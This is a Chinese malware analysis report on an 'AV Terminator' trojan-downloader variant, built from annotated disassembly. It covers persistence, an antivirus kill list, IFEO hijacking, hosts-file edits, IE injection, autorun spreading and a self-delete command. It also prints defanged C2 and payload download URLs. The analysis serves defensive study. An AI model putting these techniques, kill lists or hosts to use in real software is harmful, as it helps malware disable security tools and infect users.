

# AV 终结者新变种

> 原文：[`www.pediy.com/kssd/pediy10/80837.html`](https://www.pediy.com/kssd/pediy10/80837.html)

一、病毒标签：  
病毒名称：  AV 终结者新变种 TrojWare.Win32.TrojanDownloader.KillAV  
病毒类型：  下载者  
文件 SHA1： 3ed481ed4280121aea776575a3417a45a2f833b2  
危害等级：  3  
文件长度：  脱壳前 40,703 字节，脱壳后 200,656 字节  
受影响系统：Microsoft Windows NT 4.0  
Microsoft Windows NT 4.0 Terminal Services Edition  
Microsoft Windows 2000  
Microsoft Windows XP  
Microsoft Windows Server 2003  
开发工具： Delphi  
加壳类型： Upack 0.3.9 beta2s -> Dwing  
  
二、病毒描述：  
   病毒复制自身到系统 system\\目录，文件名称 jjxzwzjy090121.exe，并释放出 jjxzajcj32dl.dll。劫持杀软，jjxzajcj32dl.dll 注  
  
入到 ie 后访问并下载大量病毒木马。  
  
三、行为分析：  
1、病毒复制自身到系统 system\\目录，文件名称 jjxzwzjy090121.exe，并释放出 jjxzajcj32dl.dll。  

代码:

```
Upack:00178CA6                 call    @System@@LStrAsg$qqrpvpxv ; System::\_\_linkproc\_\_ LStrAsg(void \*,void \*)
.Upack:00178CAB                 push    offset aJjxzwzjy ; "jjxzwzjy"
.Upack:00178CB0                 push    dword\_17B6E4
.Upack:00178CB6                 push    offset a\_exe    ; ".exe"
.Upack:00178CBB                 mov     eax, offset dword\_17B674
.Upack:00178CC0                 mov     edx, 3
.Upack:00178CC5                 call    @System@@LStrCatN$qqrv ; System::\_\_linkproc\_\_ LStrCatN(void)
.Upack:00178CCA                 mov     eax, offset dword\_17B670
.Upack:00178CCF                 mov     ecx, dword\_17B674
.Upack:00178CD5                 mov     edx, dword\_17B6D0
.Upack:00178CDB                 call    @System@@LStrCat3$qqrv ; System::\_\_linkproc\_\_ LStrCat3(void)
.Upack:00178CE0                 mov     eax, offset dword\_17B71C
.Upack:00178CE5                 mov     edx, dword\_17B670 ; C:\\WINDOWS\\system\\jjxzwzjy090121.exe

```

代码:

```
Upack:00178D3B                 call    CopyFileA       ; 将自身复制到 C:\\WINDOWS\\system\\jjxzwzjy090121.exe

```

2、修改注册表以自启动。  
代码:

```
Upack:00178F05                 call    sub\_177E54      ; 修改注册表达到自启动目的
.Upack:00178F53                 call    modify\_reg\_     ; 修改注册表键值：dlncjjcdfc
.Upack:00178F53                                         ; 指向数据：%SystemRoot%\\system\\jjxzwzjy090102.exe，提权，遍

历进程

```

  
3、查询注册表键值  
代码:

```
Upack:00178A58                 mov     eax, offset aStartup ; "Startup"
.Upack:00178A5D                 call    @System@@LStrCopy$qqrv ; System::\_\_linkproc\_\_ LStrCopy(void)
.Upack:00178A62                 mov     ecx, \[ebp-28h\]
.Upack:00178A65                 mov     edx, offset aSoftwareMicr\_2 ; 

Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders
.Upack:00178A6A                 mov     eax, 80000001h
.Upack:00178A6F                 call    RegQueryValueExA\_1 ; 注册表查询键值

```

4、解密字符  
代码:

```
Upack:00178A84                 mov     eax, offset a32333831303938 ; "323338313039383237363430363835326A777C7"...
.Upack:00178A89                 call    @Adodb@TCustomADODataSet@ClearCalcFields$qqrpc ; 

Adodb::TCustomADODataSet::ClearCalcFields(char \*)
.Upack:00178A8E                 mov     edx, \[ebp-2Ch\]
.Upack:00178A91                 mov     eax, offset dword\_17B720
.Upack:00178A96                 call    @System@@LStrAsg$qqrpvpxv ; System::\_\_linkproc\_\_ LStrAsg(void \*,void \*)
.Upack:00178A9B                 lea     edx, \[ebp-30h\]
.Upack:00178A9E                 mov     eax, dword\_17B720
.Upack:00178AA3                 call    sub\_174E44      ; 解密 call，解密后为 hxxp://www.a3168.com/mydown.asp

```

5、提权  
代码:

```
.Upack:00178B32                 call    sub\_174A58      ; 提权
.Upack:00178B37                 call    sub\_176E4C      ; avp.e

```

6、KillAV  
代码:

```
Upack:00178C8C                 call    sub\_176960      ; 遍历枚举下列安全进程名，一旦发现尝试使用“ntsd -c q p pid

”命令关闭该安全进程，实现自身的保护
.Upack:00178C8C                                         ; RUNIEP.exe
.Upack:00178C8C                                         ; KRegEx.exe
.Upack:00178C8C                                         ; KVXP.kxp
.Upack:00178C8C                                         ; 360tray.exe
.Upack:00178C8C                                         ; RSTray.exe
.Upack:00178C8C                                         ; QQDoctor.exe
.Upack:00178C8C                                         ; DrRtp.exe

```

  
  
7、写入到 ini 文件  
代码:

```
Upack:00178E3C                 call    WritePrivateProfileStringA\_0 ; 写入文件 C:\\Documents and Settings\\All 

Users\\jjjydf16.ini
.Upack:00178E3C                                         ; 内容为：
.Upack:00178E3C                                         ; \[mydown\]
.Upack:00178E3C                                         ; old\_exe=
.Upack:00178E3C                                         ; old\_dll32=
.Upack:00178E3C                                         ; ver=090121
.Upack:00178E3C                                         ; fnexe=C:\\WINDOWS\\system\\jjxzwzjy090121.exe
.Upack:00178E3C                                         ; reg\_start=dlmcjjcdfc
.Upack:00178E3C                                         ; fn\_dll=C:\\WINDOWS\\system\\jjxzajcj32dl.dll

```

8、修改注册表键值，去除显示隐藏文件  
代码:

```
Upack:001782A8                 mov     edx, offset aIexp ; "iexp"
.Upack:001782AD                 call    @System@@LStrCat$qqrv ; System::\_\_linkproc\_\_ LStrCat(void)
.Upack:001782B2                 mov     eax, ebx        ; iexplore.exe
.Upack:001782B4                 mov     edx, offset aLore\_exe ; "lore.exe"
.Upack:001782B9                 call    @System@@LStrCat$qqrv ; System::\_\_linkproc\_\_ LStrCat(void)
.Upack:001782BE                 push    offset aNo      ; "no"
.Upack:001782C3                 mov     ecx, offset aCheck\_associat ; "Check\_Associations"
.Upack:001782C8                 mov     edx, offset aSoftwareMicros ; Software\\Microsoft\\Internet Explorer\\Main
.Upack:001782CD                 mov     eax, 80000001h
.Upack:001782D2                 call    modify\_reg\_
.Upack:001782D7                 push    0               ; hKey
.Upack:001782D9                 mov     ecx, offset aEnableautodial ; "EnableAutodial"
.Upack:001782DE                 mov     edx, offset aSoftwareMicr\_0 ; 

Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings
.Upack:001782E3                 mov     eax, 80000001h
.Upack:001782E8                 call    RegSetValueExA\_0
.Upack:001782ED                 push    0               ; hKey
.Upack:001782EF                 mov     ecx, offset aNonetautodial ; "NoNetAutodial"
.Upack:001782F4                 mov     edx, offset aSoftwareMicr\_0 ; 

Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings
.Upack:001782F9                 mov     eax, 80000001h
.Upack:001782FE                 call    RegSetValueExA\_0
.Upack:00178303                 push    0               ; hKey
.Upack:00178305                 mov     ecx, offset aCheckedvalue ; "CheckedValue"
.Upack:0017830A                 mov     edx, offset aSoftwareMicr\_1 ; 

SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL
.Upack:0017830F                 mov     eax, 80000002h
.Upack:00178314                 call    RegSetValueExA\_0 ; 修改注册表键值
.Upack:00178319                 xor     eax, eax

```

9、注入并下载  
代码:

```
Upack:00178FCF                 mov     ecx, dword\_17B6D8 ; C:\\program files\\internet explorer\\iexplore.exe
.Upack:00178FD5                 mov     edx, dword\_17B6DC
.Upack:00178FDB                 mov     eax, dword\_17B704
.Upack:00178FE0                 call    sub\_1785D4      ; jjxzajcj32dl.dll 注入到 IE

```

联网状态下访问：  
hxxp://www.a3168.com/mydown.asp?ver=090121&tgid=2&address=00-00-00-00-00-00  
内容为：  
begin   
1,090121,10241,hxxp://www.wew2223.cn/new/shengji.exe,120,1,180,1,10000,17,0,1,0,1 7,   
  
2,0,34000,hxxp://www.wew2223.cn/new/css.exe,10,0-24,, 2,0,47000,hxxp://www.wew2223.cn/new/ggg.exe,30,0-24,,   
  
2,90120,16000,hxxp://www.wew2223.cn/new/30.exe,100,0-24,, 2,0,148000,hxxp://www.wew2223.cn/new/msn180.exe,10,0-24,,   
  
3,127.0.0.1,js.tongji.cn.yahoo.com 3,127.0.0.1,img.tongji.cn.yahoo.com  
end  
下载大量病毒木马。  
  
10、自删除  
代码:

```
.Upack:0017901F                 call    sub\_177CAC      ; 命令行执行自删除 cmd  /c del "源程序路径"

```

11、创建含木马信息的配置文件到 C:\\Documents and Settings\\All Users 目录下，名称为“jjjydf16.ini”，内容如下：  
代码:

```
\[mydown\]
old\_exe=
old\_dll32=
ver=090121
fnexe=C:\\WINDOWS\\system\\jjxzwzjy090121.exe
reg\_start=dlmcjjcdfc
fn\_dll=C:\\WINDOWS\\system\\jjxzajcj32dl.dll
\[kill\]
window=33383533353533313939323633343930232825
\[run\]
delay=120
pzjg=180
xxjg=10000

```

名称为“jjdf32.ini”，内容为：  
代码:

```
\[sys\]
acitve\_install=20090122
\[md5\_ver\]
efe0aae928e90bef3a055b32637ea561=0
f0090c73647ed989a4202f6f2501ed59=90121

```

这里代码太长，就不贴了。  
  
12、修改 hosts 文件  
代码:

```
CODE:0040DFE2                 mov     eax, \[ebp+var\_34\]
CODE:0040DFE5                 call    sub\_40AEC0      ; 修改 hosts 文件，drivers\\etc\\hosts
CODE:0040DFE5                                         ; 127.0.0.1 img.tongji.cn.yahoo.com
CODE:0040DFE5                                         ; 127.0.0.1 js.tongji.cn.yahoo.com
CODE:0040DFE5                                         ; 127.0.0.1       js.tongji.cn.yahoo.com
CODE:0040DFE5                                         ; 127.0.0.1       img.tongji.cn.yahoo.com
CODE:0040DFEA

```

13、修改注册表  
代码:

```
CODE:0040DFF3                 call    sub\_40D6A4      ; 修改注册表

```

14、劫持杀软  
代码:

```
CODE:0040E040                 call    sub\_40D390      ; 劫持

```

代码:

```
SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\
Debugger
svchost.exe
360rpt.exe
360Safe.exe
360tray.exe
adam.exe


AgentSvr.exe
AppSvc32.exe
auto.exe
AutoRun.exe
autoruns.exe
avgrssvc.exe
AvMonit
or.exe
avp.com
avp.exe
CCenter.exe
ccSvcHst.exe
cross.exe
enc98.EXE
FileDsty.exe
FTCleanerShell.exe
guangd.exe
HijackThis.exe
IceSword.exe
iparmo.exe
Iparmor.exe
isPwdSvc.exe
kabaload.exe
KaScrScn.SCR
KASMain.exe
KASTask.exe
KAV32.exe
KAVDX.exe
KAVPFW.exe
KAVSetup.exe
KAVStart.exe
KISLnchr.exe
KMailMon.exe
KMFilter.exe
KPFW32.exe
KPFW32X.exe
KPFWSvc.exe
KRegEx.exe
KRepair.COM
KsLoader.exe
KVCenter.kxp
KvDetect.exe
KvfwMcl.exe
KVMonXP.kxp
KVMonXP\_1.kxp
kvol.exe
kvolself.exe
KvReport.kxp
KVSrvXP.exe
KVStub.kxp
kvupload.exe
kvwsc.exe
KvXP.kxp
KWatch.exe
KWatch9x.exe
KWatchX.exe
loaddll.exe
MagicSet.exe
mcconsol.exe
mmqczj.exe
mmsk.exe
NAVSetup.exe
nod32krn.exe
nod32kui.exe
PFW.exe
PFWLiveUpdate.exe
QHSET.exe
Ras.exe
Rav.exe
RavMon.exe
RavMonD.exe
RavStub.exe
RavTask.exe
RegClean.exe
rfwcfg.exe
RfwMain.exe
rfwProxy.exe
rfwsrv.exe
RsAgent.exe
Rsaupd.exe
runiep.exe
safelive.exe
scan32.exe
SDGames.exe
shcfg32.exe
ShuiNiu.exe
SmartUp.exe
sos.exe
SREng.exe
svch0st.exe
symlcsvc.exe
SysSafe.exe
Systom.exe
taskmgr.exe
TNT.Exe
TrojanDetector.exe
Trojanwall.exe
TrojDie.kxp
TxoMoU.Exe
ua80.EXE
UFO.exe
UIHost.exe
UmxAgent.exe
UmxAttachment.exe
UmxCfg.exe
UmxFwHlp.exe
UmxPol.exe
UpLive.EXE
WoptiClean.exe
XP.exe
zxsweep.exe
QQDoctor.exe
RStray.exe

```

  
15、遍历磁盘驱动器  
代码:

```
CODE:0040E217                 jz      loc\_40E144      ; 遍历以下几个分区
CODE:0040E21D                 mov     edx, offset aC  ; "c"
CODE:0040E222                 mov     eax, \[ebp+var\_54\]
CODE:0040E225                 call    GetDriveTypeA\_0
CODE:0040E22A                 mov     edx, offset aD  ; "d"
CODE:0040E22F                 mov     eax, \[ebp+var\_54\]
CODE:0040E232                 call    GetDriveTypeA\_0
CODE:0040E237                 mov     edx, offset aE  ; "e"
CODE:0040E23C                 mov     eax, \[ebp+var\_54\]
CODE:0040E23F                 call    GetDriveTypeA\_0
CODE:0040E244                 mov     edx, offset aF  ; "f"
CODE:0040E249                 mov     eax, \[ebp+var\_54\]
CODE:0040E24C                 call    GetDriveTypeA\_0
/////进入其中一个 call
CODE:0040C155                 call    @Sysutils@FileSetAttr$qqrx17System@AnsiStringi ; Sysutils::FileSetAttr

(System::AnsiString,int)
CODE:0040C15A                 lea     eax, \[ebp+var\_14\]
CODE:0040C15D                 mov     edx, offset aAutorun ; "AutoRun"
CODE:0040C162                 call    @System@@LStrLAsg$qqrpvpxv ; System::\_\_linkproc\_\_ LStrLAsg(void \*,void \*)
CODE:0040C167                 push    \[ebp+lpString\]
CODE:0040C16A                 push    offset asc\_40C278 ; ":"
CODE:0040C16F                 push    \[ebp+var\_14\]
CODE:0040C172                 push    offset a\_inf    ; ".inf"
CODE:0040C177                 lea     eax, \[ebp+lpKeyName\]
CODE:0040C17A                 mov     edx, 4
CODE:0040C17F                 call    @System@@LStrCatN$qqrv ; System::\_\_linkproc\_\_ LStrCatN(void)
CODE:0040C184                 mov     eax, \[ebp+lpKeyName\]
CODE:0040C187                 call    LoadLibraryA\_0
CODE:0040C18C                 test    eax, eax
CODE:0040C18E                 jz      short loc\_40C1A7
CODE:0040C190                 xor     edx, edx
CODE:0040C192                 mov     eax, \[ebp+lpKeyName\]
CODE:0040C195                 call    @Sysutils@FileSetAttr$qqrx17System@AnsiStringi ; Sysutils::FileSetAttr

(System::AnsiString,int)
CODE:0040C19A                 mov     eax, \[ebp+lpKeyName\]
CODE:0040C19D                 call    @System@@LStrToPChar$qqrx17System@AnsiString ; System::\_\_linkproc\_\_ 

LStrToPChar(System::AnsiString)
CODE:0040C1A2                 call    sub\_40560C
CODE:0040C1A7
CODE:0040C1A7 loc\_40C1A7:                             ; CODE XREF: GetDriveTypeA\_0+196 j
CODE:0040C1A7                 mov     eax, \[ebp+lpKeyName\]
CODE:0040C1AA                 push    eax             ; lpKeyName
CODE:0040C1AB                 lea     eax, \[ebp+AppName\]
CODE:0040C1AE                 push    eax             ; lpAppName
CODE:0040C1AF                 mov     ecx, offset asc\_40C2B8 ; "?
CODE:0040C1B4                 mov     edx, offset aShellOpen ; "shell\\\\open"
CODE:0040C1B9                 mov     eax, \[ebp+var\_14\]
CODE:0040C1BC                 call    WritePrivateProfileStringA\_0
CODE:0040C1C1                 mov     eax, \[ebp+lpKeyName\]
CODE:0040C1C4                 push    eax             ; lpKeyName
CODE:0040C1C5                 lea     eax, \[ebp+var\_38\]
CODE:0040C1C8                 push    eax             ; lpAppName
CODE:0040C1C9                 mov     ecx, \[ebp+var\_C\]
CODE:0040C1CC                 mov     edx, offset aShellOpenComma ; "shell\\\\open\\\\Command"
CODE:0040C1D1                 mov     eax, \[ebp+var\_14\]
CODE:0040C1D4                 call    WritePrivateProfileStringA\_0
CODE:0040C1D9                 mov     eax, \[ebp+lpKeyName\]
CODE:0040C1DC                 push    eax             ; lpKeyName
CODE:0040C1DD                 lea     eax, \[ebp+var\_3C\]
CODE:0040C1E0                 push    eax             ; lpAppName
CODE:0040C1E1                 mov     ecx, offset a1\_0 ; "1"
CODE:0040C1E6                 mov     edx, offset aShellOpenDefau ; "shell\\\\open\\\\Default"
CODE:0040C1EB                 mov     eax, \[ebp+var\_14\]
CODE:0040C1EE                 call    WritePrivateProfileStringA\_0
CODE:0040C1F3                 mov     eax, \[ebp+lpKeyName\]
CODE:0040C1F6                 push    eax             ; lpKeyName
CODE:0040C1F7                 lea     eax, \[ebp+var\_40\]
CODE:0040C1FA                 push    eax             ; lpAppName
CODE:0040C1FB                 mov     ecx, offset aA  ; "资源管理?
CODE:0040C200                 mov     edx, offset aShellExplore ; "shell\\\\explore"
CODE:0040C205                 mov     eax, \[ebp+var\_14\]
CODE:0040C208                 call    WritePrivateProfileStringA\_0
CODE:0040C20D                 mov     eax, \[ebp+lpKeyName\]
CODE:0040C210                 push    eax             ; lpKeyName
CODE:0040C211                 lea     eax, \[ebp+var\_44\]
CODE:0040C214                 push    eax             ; lpAppName
CODE:0040C215                 mov     ecx, \[ebp+var\_C\]
CODE:0040C218                 mov     edx, offset aShellExploreCo ; "shell\\\\explore\\\\command"
CODE:0040C21D                 mov     eax, \[ebp+var\_14\]
CODE:0040C220                 call    WritePrivateProfileStringA\_0
CODE:0040C225                 mov     edx, 3
CODE:0040C22A  

```